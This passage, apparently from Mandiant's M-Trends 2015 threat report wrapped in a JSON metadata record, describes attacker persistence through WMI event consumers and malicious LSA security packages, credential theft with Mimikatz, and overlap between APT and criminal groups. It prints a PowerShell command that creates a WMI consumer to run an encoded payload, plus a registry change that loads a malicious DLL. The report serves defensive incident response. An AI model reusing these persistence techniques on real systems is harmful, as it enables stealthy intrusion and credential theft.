Base64 encoded\nstring as an argument. This string could contain\nany added PowerShell code—say, a basic\ndownloader or backdoor— without the need\nfor a script file on disk. If bound to a suitable\nevent filter, this consumer could run on a\nrecurring basis.\n\nWMI-based persistence poses several challenges\nto forensic analysts. Attackers can create filters\nand consumers executed both locally and\nremotely using PowerShell commands. Unlike\nmany persistence mechanisms, they leave no\nartifacts in the registry.\n\nThe objects reside on disk within a complex\ndatabase (the WMI repository objects.data) that\ncan be difficult to examine. Furthermore,\nWindows audits newly created or triggered filters\nand consumers only when debug-level logging is\nenabled. This is neither a default setting, nor\nintended for long-term use due to the heavy\nvolume of events it generates.[5]\n\n\n###### Malicious Security Packages\n\nWe observed several cases in which attackers\nused Windows Local Security Authority (LSA)\nsecurity packages, an uncommon registry-based\npersistence mechanism, to automatically load\nmalware while evading detection. Security\npackages are a set of DLLs loaded by the LSA upon\nsystem start-up. These packages are configured\nunder values within the registry key HKLM\\\n_SYSTEM\\CurrentControlSet\\Control\\Lsa. Each of_\nthese values contains a list of strings referencing\nfilenames (without extensions) to\nbe loaded from %SYSTEMROOT%\\system32\\.\n\nBecause LSA packages are automatically loaded\nby LSASS.EXE, an attacker with administrator\nprivileges can add or modify entries to persist a\nmalicious DLL. During a case we investigated in\n2014, an attacker modified the Security Packages\nvalue to keep the loader component of a multistage backdoor, tspkgEx.dll, on the system.[6]\n\nFigure 9 illustrates the changed value.\n\nThis change caused LSASS.EXE to load C:\\\n_WINDOWS\\system32\\tspkgEx.dll upon boot._\n\n```\nSet-WmiInstance -Namespace “root\\subscription” -Class ‘CommandLineEventConsumer’\n-Arguments @{ name=’EvilWMI’;CommandLineTemplate=”C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe –enc SQBuAHYAbwBrAGUALQBDAG8AG8AbQ...<SNIP>”;RunInteractively=’false’}\n\n```\n\n**Figure 8: Excerpt of PowerShell command to create WMI consumer**\n\n```\nSECURITY PACKAGES (before change): kerberos msv1_0 schannel wdigest tspkg pku2u\nSECURITY PACKAGES (after change): kerberos msv1_0 schannel wdigest tspkg pku2u\ntspkgEx\n\n```\n\n**Figure 9: Changing HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages to load malware**\n\n5 Mandiant’s MIRcon 2014 conference included talks on both WMI and PowerShell that provide more details and case studies on these techniques—as well\nas recommended approaches for detection and forensic analysis. The presentations are available at https://dl.mandiant.com/EE/library/MIRcon2014/\nMIRcon_2014_IR_Track_There%27s_Something_About_WMI.pdf and https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_\nInvestigating_Powershell_Attacks.pdf.\n\n6 We’ve sanitized the dll name here.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n###### In nearly all of our investigations, the victims’ anti-virus software failed to hinder Mimikatz, despite the tool’s wide reach and reputation. Attackers typically modified and recompiled the source code to evade detection.\n\n\nBecause LSA is extensible, custom security\npackages can also be used to process user\ncredentials upon logon. A malicious security\npackage can abuse this capability to capture\npasswords in plaintext during logon events.\n\nWe investigated a targeted attack in 2014 in\nwhich the intruder deployed malware that loaded\nas a security package for this very purpose. The\nwidely available Mimikatz[7] toolkit also includes a\nsecurity provider, mimilib ssp, which can steal\npasswords if loaded.[8]\n\n###### Stealing passwords with ease\n\nWidely available credential-stealing tools have\ngreatly made harvesting passwords and escalating\nprivileges in a Windows environment much easier.\nThroughout 2014, targeted attackers typically\nused two techniques:\n\n- “Pass-the-hash” to authenticate with stolen\nNTLM hashes\n\n- Using Mimikatz to recover plaintext\npasswords from memory\n\nMicrosoft has reduced (but not eliminated)\nthe effectiveness of these techniques in\nWindows Server 2012 R2 and Windows 8.1.\nBut most clients we worked with last year still\nrelied on Server 2008 functional domains and\nWindows 7 endpoints.\n\nPass-the-hash remains a tried-and-true technique,\nespecially in settings where groups of systems\nhave the same local administrator passwords.\n\n7 https://github.com/gentilkiwi/mimikatz5\n\n\nMimikatz goes a step further by snaring plaintext\nWindows passwords that the operating system\nmaintains in memory to support various forms of\nsingle sign-on.\n\nOn an employee workstation, the exposure could\nbe limited to the user’s own domain account\npassword. On a shared server that receives many\ninteractive logon sessions, such as via Remote\nDesktop Protocol (RDP) or the PsExec utility, the\nnumber of exposed passwords might be far\ngreater. Victims quickly learned that the path\nfrom a few infected systems to complete\ncompromise of an Active Directory domain\ncould be incredibly short.\n\nIn nearly all of our investigations, the victims’\nanti-virus software failed to hinder Mimikatz,\ndespite the tool’s wide reach and reputation.\nAttackers typically modified and recompiled the\nsource code to evade detection. Or they deployed\nvariants such as the “Invoke-Mimikatz”\nPowerShell script that can run solely in memory.\n\n2014 also brought about several new attack\ntechniques that targeted Kerberos, the default\nauthentication mechanism in modern Windows\ndomains. The most notorious of these, the\nMimikatz “golden ticket,” allows an intruder that\nhas compromised a domain controller to generate\na Kerberos ticket-granting ticket for any user.\n\nThis golden ticket can be generated offline, remain\nvalid for an indefinite lifespan, and be used to\nimpersonate any account—even after a password\n_reset. An attacker with a golden ticket could_\n\n\n8 Matt Graeber presented additional research on malicious security packages, and mechanisms to detect and limit their usage, at MIRCon 2014. It’s available\nat https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf\n\n\n-----\n\nre-compromise a remediated environment and\ninstantly regain domain administrator privileges.\n\nThe only way to mitigate the golden ticket attack,\nshort of avoiding a domain compromise in the first\nplace, is resetting the password for the Kerberos\nKey Distribution Service Account krbtgt twice in\nsuccession. Doing so clears the account’s\npassword history and invalidates all previously\ngenerated Kerberos tickets.\n\n###### Moving laterally with WMI and PowerShell\n\nIn the past, moving laterally and executing\ncommands in a typical Windows attack usually\nentailed a mix of built-in Windows utilities (such\nas net, at, and so on), custom malware, batch or\nVisual Basic (VB) scripts, and regular\nadministration tools such as PsExec. These\ntechniques were reliable and easy for attackers to\nuse. But they also left behind telltale forensic\nartifacts and footprints.\n\nBetween 2013 and 2014, we observed a distinct\nshift in lateral-movement tactics by several of the\nadvanced persistent threat (APT) groups that we\ntrack. More often than before, these groups are\nusing WMI and PowerShell to move laterally,\nharvest credentials, and search for useful\ninformation within Windows environments.\n\n\nIn the same way, many security researchers\nand penetration-testing tools have adopted\nPowerShell over the past several years.\nThe result has been more publicly available\ninformation and source code from which both\nattackers and defenders can learn.\n\nEarlier in this section, we described how attackers\nused WMI events to maintain a presence in\ncompromised environments. Attackers also use\nthe WMI command line tool wmic.exe, which\nextends WMI’s capabilities to the shell and scripts.\nAttackers can use WMI to connect to remote\nsystems, modify the registry, access event logs,\nand most important, execute commands. Aside\nfrom an initial logon event, remote WMI\ncommands often leave little evidence on the\naccessed system.\n\nIn several cases we analyzed in 2014, attackers\nrelied upon remote commands in PowerShell\nand in-memory scripts to move laterally and\nharvest credentials. PowerShell code can execute\nin memory without ever touching disk on an\naccessed system, limiting any evidence. And\nolder versions of PowerShell that are installed\nby default in typical environments cannot\nmaintain a detailed audit trail of executed code.\n\n\n###### THE TAKEAWAY: Advanced threat actors continue to evolve their tools and tactics to reduce the forensic footprint of their activities and evade detection. Targeted organizations need to ensure that they maintain capabilities for both real-time monitoring and “look-back” forensics capabilities across endpoint systems, log sources, and network devices. Establishing a baseline of normal activity in an environment, and proactively hunting for deviations from this baseline, are essential to stay a step ahead of intruder’s efforts.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n##### TREND 4:  BLURRED LINES—CRIMINAL AND APT ACTORS TAKE A PAGE FROM EACH OTHERS’ PLAYBOOK\n\n###### Our investigations over the past year have confirmed an emerging trend: cyber criminals are stealing a page from the playbook of APT actors, while APT actors  are using tools widely deployed by cyber criminals. As these actors’ tactics merge, discerning their goals becomes critical to gauging the impact of incidents and  building a risk-informed security strategy.\n\n\ne spent the year investigating\nattacks that we’ve tracked to\nRussian threat actors and found\n\n## W\n\ngray areas that made distinguishing criminal\ngangs from nation-state actors a challenge. If\ntools and tradecraft become harder to tell apart,\nanalyzing actors’ intent becomes essential to\nscoping their potential impact.\n\nSome of the targeted financial threat groups\nthat we track exhibit traits that look more like\nstate-sponsored APT activity than the typical\nopportunistic cyber criminal. Figure 10 on\npage 21 describes tactical overlaps between\nknown APT groups and cyber crime cases we\nencountered in 2014.\n\n###### It’s complicated: assessing intent in the face of uncertainty\n\nGiven these tactical overlaps, analysts need to\nkeep an open mind when they approach their\nresearch or assess actors’ motivations; it’s not\n\n\nenough to look at one technique or tool in\nisolation to discern intent. Some recent Russiabased activity we tracked over the past year\nillustrates the importance and challenge of\nanalyzing actors’ ultimate objectives when it\ncomes to interpreting their technical behavior.\n\nIn October 2014, we detailed the activities\nof APT28, a threat group we believe steals\nsensitive political and military intel for the\nRussian government. For years, APT28 has\ntargeted defense firms, governments, militaries,\nand intergovernmental bodies.\n\nOther researchers have exposed another\nRussia-based threat group that, like APT28,\nalso appears to be spying for the Russian\ngovernment. This second group is known by\nvarious researchers as the “Sandworm Team,”[9]\n“Quedagh”[10] and “BE2 APT.”[11]\n\n\n9 Cyber Espionage Operators Sandworm Team Leverage CVE-2014-4114 Zero-Day.” iSight Partners. 14 Oct. 2014. Web. 2 Dec. 2014.;\n\n10 https://www.f-secure.com/documents/996508/1030745/blackenergy_whitepaper.pdf\n\n11 https://securelist.com/blog/research/67353/be2-custom-plugins-router-abuse-and-target-profiles/\n\n\n-----\n\n|TACTIC|EXAMPLES OF OVERLAPPING USAGE|\n|---|---|\n|Social Engineering|Social engineering isn’t just for APT groups. This year we saw financial threat groups use spear- phishing emails both as the initial infection vector and in their repeated attempts to regain access to the victim after remediation using victim-specific phishes. Interactive social engineering is also a tactic both threat actor types have used. In one engagement, financially motivated actors crafted social media profiles on a popular platform and reached out to company employees in an attempt to get them to download backdoors. Meanwhile, APT3, a suspected nation-state actor, created a fake female persona and contacted a company employee via a popular social network. After three weeks of back and forth messaging, “she” sent her “resume” to his personal email address—the resume was weaponized with one of APT3’s backdoors. “She” also asked other employees probing questions, including the name of their IT Manager, and what versions of software they ran.|\n|Custom Malware & Tools|Both APT and financial actors have been known to create their own custom tools. In one case, cyber criminals deployed more than 60 variants of malware and utilities that they created over the course of the several years they were in the victim’s environment. Meanwhile, APT28, a Russia-based APT group, has systematically evolved its malware for more than seven years, creating malware platforms that give them flexibility in staying in an environment.|\n|Crimeware|Crimeware includes publicly available toolkits and those that are sold for profit. It’s not just for financially-motivated cyber criminals. One suspected Russia-based APT group used zero-day exploits to install variants of BlackEnergy, a toolkit widely used by cyber criminals for years. Many remote access tools are used heavily by APT and cybercriminals alike.12 It serves as a reminder that tools themselves should never be the sole determining factor when attributing different types of attacks.|\n|Maintaining Persistence|Cyber cash outs are no longer dominated by smash-and-grabs. Maintaining persistence has long been a hallmark of APT actors, who work to stay in an environment until they’ve completed their mission. But financial actors have increasingly shown their ability to maintain a low profile. In one case, cyber criminals maintained stealthy persistence using well-known Windows startup registry locations to launch their malware. In another, financial threat actors managed to maintain access to an environment for more than five years. We’ve even seen persistence in financial threat actors trying to get back into an environment after being kicked out.|\n|Scope of Data Theft|Data theft is happening on a broader scale, and from large sets of data. Attackers continued to pursue and obtain large repositories of personally identifiable information (PII). Historically, financial threat actors stole PII to commit fraud or resell the data on underground markets. But the array of attackers interested in PII has broadened to include APT actors with their own unique objectives, wholly unrelated to financial gain. Now we’ve uncovered APT groups such as APT18 stealing PII, too—which is not a typical APT objective.13|\n\n\n**Figure 10: How the tactics of APT groups and cyber criminals overlap**\n\n12 https://www.fireeye.com/blog/threat-research/2014/04/crimeware-or-apt-malwares-fifty-shades-of-grey.html\n\n13 APT18 is also a China-based threat group. See https://www2.fireeye.com/WBNR-14Q3HealthcareWebinar.html\n\n\n-----\n\n**M-Trends** A view from the front lines\n\nThe group appeared to target the same types of\nvictims as APT28, with some key differences. For\none, it used zero-day exploits and criminal tools.\nAnd it may have targeted critical infrastructure in\nthe U.S.[14, 15]\n\nBased on analysis of the malware and\ninfrastructure used in the attacks, the Sandworm\nteam used the BlackEnergy toolkit[16] to target\nvictims in Ukraine, echoing ongoing tensions\nbetween Ukraine and Russia. This group also is\nsaid to have deployed the BlackEnergy toolkit to\ntarget supervisory control and data acquisition\n(SCADA) equipment, which is widely used in\nindustrial and critical-infrastructure settings.[17]\n\nThe targeted systems were production tools in\nuse in a variety of industries—not vendor-owned\nprototypes or networks that contain or transmit\nsensitive financial information or intellectual\nproperty. The nature of these targeted systems\nsuggests that attackers may have been scouting\nout weaknesses for disruptive attacks. Using\ncrimeware toolkits such as BlackEnergy in those\nefforts may provide these attackers a degree of\nanonymity and plausible deniability.\n\n###### Do these differences matter?\n\nIn the security community, the value of discerning\nattackers’ motives and attributing attacks to\nspecific threat actors is often up for debate. Some\n\n\nargue that from a network-defense viewpoint, it\ndoesn’t matter who compromised the system—the\nattack just needs to be stopped and cleaned up.\n\nAt the same time, the increasingly blurry lines\nbetween cyber criminal and APT tools and tactics\nfurther muddies questions of actor intent and the\npotential fallout. Chalk it up to attackers’ denial\nand deception, uneven law enforcement, and\nByzantine ties between corrupt government\nagents and the criminal underground.\n\nIn this hazy state of affairs, unraveling attackers’\nintents and motives can guide your response.\nCase in point: the Russia-based threat group\ncollecting intelligence for a sponsor government\nis deploying crimeware tools that give it remote\naccess to elements of U.S. critical infrastructure.\nThe group may use common crimeware, but\ntreating these attacks as a run-of-the-mill cyber\ncrime would be a mistake.\n\nJudging whether the malware in your network is\na possible infection vector for a state-sponsored\nattack—and not a collateral infection from a\nnuisance threat—would no doubt change your\nreaction and response. Likewise, stolen personal\ndata in the hands of cyber criminals may require a\ndifferent response—and have a more immediate\nimpact—than data falling into the hands of a\nnation-state threat group with other, murkier\nuses for it.\n\n\n###### and create a security strategy appropriate for the threats you face.\n\n\n14 http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/\n\n15 https://www.virusbtn.com/conference/vb2014/abstracts/LM3-LipovskyCherepanov.xml\n\n16 BlackEnergy provides an extensible framework that lets threat actors add new features and functions via a collection of dynamic-link libraries (DLL). Each\nDLL plugin can be written with specific feature in mind, storing plugins in an encrypted file. On the surface, they all appear the same, making threat actors’\nultimate intent harder to discern. BlackEnergy has been popular with cyber criminals and used for distributed denial-of -service (DDoS) attacks. (See http://\natlas-public.ec2.arbor.net/docs/BlackEnergy+DDoS+Bot+Analysis.pdf; http://blogs.mcafee.com/business/security-connected/evolving-ddos-botnets-1blackenergy)\n\n17 http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/\n\n\n-----\n\n##### CONCLUSION\n\n###### Attackers continued to evolve, their targets continued to expand, and their techniques continued to change. But the central narrative stayed the same: far  too many organizations were unprepared for the inevitable breach, allowing attackers to linger far too long in compromised environments.\n\n\ns cyber security goes mainstream,\norganizations should consider data\nbreaches in a new light—not a source\n\n## A\n\nof fear and shame but a business reality. They\nshould anticipate and confront security incidents\nwith confidence.\n\nThat boldness requires a new approach to\ncyber security. No one can prevent every breach.\nBut by preventing, detecting, analyzing, and\nresponding to the most advanced threats quickly\nand effectively, you can protect yourself, your\ncustomers, and your partners from the headlinegenerating consequences.\n\n\nNo security is perfect. No one can predict every\nnew intrusion technique. And as we continued to\nsee in 2014, no threat group is going to close up\nshop just because they’ve been thwarted by a\nnew security tool.\n\nStill, with the right mix of technology, intelligence,\nand expertise, organizations can begin to close\nthe security gap. They can adapt to stay ahead\nof new threats, new tools, and clever new ways\nto compromise networks.\n\n**The bad guys are smart, well equipped, and**\n**determined. There’s no reason that the good**\n**guys can’t be the same.**\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n###### About Mandiant\n\nMandiant, a FireEye company, has driven threat actors out of the computer networks and endpoints of\nhundreds of clients across every major industry. We are the go-to organization for the Fortune 500 and\ngovernment agencies that want to defend against and respond to critical security incidents of all kinds.\nWhen intrusions are successful, Mandiant’s security consulting services—backed up by threat intelligence\nand technology from FireEye—help organizations respond and resecure their networks.\n\n###### About FireEye\n\nFireEye protects the most valuable assets in the world from those who have them in their sights. Our\ncombination of technology, intelligence, and expertise—reinforced with the most aggressive incident\nresponse team—helps eliminate the impact of security breaches. We find and stop attackers at every\nstage of an incursion. With FireEye, you’ll detect attacks as they happen. You’ll understand the risk these\nattacks pose to your most valued assets. And you’ll have the resources to quickly respond and resolve\nsecurity incidents. The FireEye Global Defense Community includes more than 2,700 customers across\n67 countries, including over 157 of the Fortune 500.\n\n\n-----\n\n-----\n\nA FireEye® Company\n\n\nMandiant, a FireEye Company | 703.683.3141 | 800.647.7020 | info@mandiant.com | **[www.mandiant.com](http://www.mandiant.com)**\n\n© 2014 FireEye, Inc. All rights reserved. Mandiant and the M logo are registered trademarks\nof FireEye, Inc. All other brands, products, or service names are or may be trademarks or\nservice marks of their respective owners. RPT.MTRENDS.EN-US.022415\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf"
    ],
    "report_names": [
        "rpt-m-trends-2015.pdf"
    ],
    "threat_actors": [
        {
            "id": "c8aefee7-fb57-409b-857e-23e986cb4a56",
            "created_at": "2023-01-06T13:46:38.285223Z",
            "updated_at": "2025-03-27T02:00:02.79333Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "TG-0416",
                "SCANDIUM",
                "PLA Navy",
                "Wekby",
                "G0026",
                "DYNAMITE PANDA"
            ],
            "source_name": "MISPGALAXY:APT18",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "61c4ddc4-156b-4828-8570-0979da81f3d0",
            "created_at": "2022-10-25T16:47:55.593828Z",
            "updated_at": "2025-03-27T02:05:17.275161Z",
            "deleted_at": null,
            "main_name": "BRONZE MAYFAIR",
            "aliases": [
                "Gothic Panda ",
                "TG-0110 ",
                "APT3 "
            ],
            "source_name": "Secureworks:BRONZE MAYFAIR",
            "tools": [
                " HUC Proxy Malware (Htran)",
                " Pirpi",
                " SplitVPN",
                " ctt",
                " ctx",
                "Cookiecutter"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2669aa86-663f-4e72-9362-9e61ff3599f4",
            "created_at": "2022-10-25T15:50:23.344796Z",
            "updated_at": "2025-03-27T02:00:55.448539Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "APT18",
                "TG-0416",
                "Dynamite Panda",
                "Threat Group-0416"
            ],
            "source_name": "MITRE:APT18",
            "tools": [
                "hcdLoader",
                "gh0st RAT",
                "cmd",
                "Pisloader",
                "HTTPBrowser"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "13354d3f-3f40-44ec-b42a-3cda18809005",
            "created_at": "2022-10-25T15:50:23.275272Z",
            "updated_at": "2025-03-27T02:00:55.418075Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "APT3",
                "Gothic Panda",
                "Pirpi",
                "UPS Team",
                "Buckeye",
                "Threat Group-0110",
                "TG-0110"
            ],
            "source_name": "MITRE:APT3",
            "tools": [
                "OSInfo",
                "schtasks",
                "PlugX",
                "LaZagne",
                "SHOTPUT",
                "RemoteCMD"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1424768524,
    "ts_modification_date": 1424769229,
    "files": {
        "pdf": "https://archive.orkl.eu/077cdeeefd287808b4b1b8ed262a7a63df21643f.pdf",
        "text": "https://archive.orkl.eu/077cdeeefd287808b4b1b8ed262a7a63df21643f.txt",
        "img": "https://archive.orkl.eu/077cdeeefd287808b4b1b8ed262a7a63df21643f.jpg"
    }
}